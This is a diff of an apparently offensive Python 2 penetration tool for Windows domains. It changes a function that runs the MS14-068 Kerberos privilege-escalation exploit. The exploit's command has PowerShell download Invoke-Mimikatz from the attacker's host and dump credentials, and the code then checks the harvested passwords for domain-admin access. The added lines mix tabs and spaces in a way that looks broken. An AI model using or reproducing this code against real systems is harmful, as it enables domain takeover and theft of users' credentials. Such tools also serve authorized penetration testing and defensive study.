@@ -4193,8 +4193,8 @@ def testMS14_068(ip,domain,username,password,passwordHash):
     address=netbiosName
     tmpFoundCreds=[]    
     if domain.lower()==domainFull.lower() or domain.lower()==domainShort.lower():
-        print "adding: "+username+"\t"+password
-        tmpFoundCreds.append([username,password])
+	if testDomainCredentials1(username,password,dc_ip)==True:
+        	tmpFoundCreds.append([username,password])
     #print domainShort
     #for x in userPassList:
     #    if domainFull.lower() in str(x).lower():
@@ -4204,25 +4204,27 @@ def testMS14_068(ip,domain,username,password,passwordHash):
     if len(tmpFoundCreds)>0:
         username=tmpFoundCreds[0][0]
         password=tmpFoundCreds[0][1]
-        command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
-        dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
-        try:
-            dumper.exploit()
-            tmpPasswordList=parseMimikatzOutput(dumper.getOutput())
-            if len(tmpPasswordList)>0:
-                print "\nTesting Credentials"
-                for y in tmpPasswordList:
-                    tmpdomain=y[0]
-                    tmpusername=y[1]
-                    tmppassword=y[2]
-                    tmppasswordHash=None
-                    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],tmpdomain,False)
-                    if tmpAdminOK==True:
-                        if y not in daPassList:
-                            daPassList.append(y)
-                        tmpPassList.append(y)  
-        except Exception:
-            pass
+	if testDomainCredentials1(username,password,target_ip)==True:
+        	powershellPath=getPowershellPath(target_ip,domain,username,password,passwordHash)
+        	command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
+        	dumper=MS14_068(address,target_ip, username, password, domainFull, None, command, None, None, dc_ip)    
+        	try:
+            		dumper.exploit()
+            		tmpPasswordList=parseMimikatzOutput(dumper.getOutput())
+            		if len(tmpPasswordList)>0:
+                		print "\nTesting Credentials"
+                		for y in tmpPasswordList:
+                		    tmpdomain=y[0]
+                    		    tmpusername=y[1]
+                    		    tmppassword=y[2]
+                    		    tmppasswordHash=None
+                    		    tmpLoginOK,tmpAdminOK=testDomainCredentials(tmpusername,tmppassword,tmppasswordHash,dcList[0],tmpdomain,False)
+                    		    if tmpAdminOK==True:
+                       		 	if y not in daPassList:
+                        	    		daPassList.append(y)
+                        		tmpPassList.append(y)  
+        	except Exception:
+            		pass
     dumper=None
     if len(tmpFoundCreds)>0:
         username=tmpFoundCreds[0][0]
